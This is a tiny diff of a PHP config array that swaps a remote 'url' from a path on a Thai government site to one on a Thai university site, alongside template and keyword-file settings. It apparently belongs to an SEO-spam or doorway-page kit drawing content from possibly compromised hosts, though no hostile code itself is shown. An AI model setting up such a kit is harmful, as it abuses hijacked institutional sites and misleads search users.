@@ -1,6 +1,6 @@
 <?php
 $config = array(
-        'url'		=> 'https://www.lp-pao.go.th/Main60/tmp/style/',
+        'url'		=> 'https://itsc2.rsu.ac.th/style/',
         'parameter' => 'go',
         'template'  => 'temp.html',
         'keywords'  => 'bb.txt',
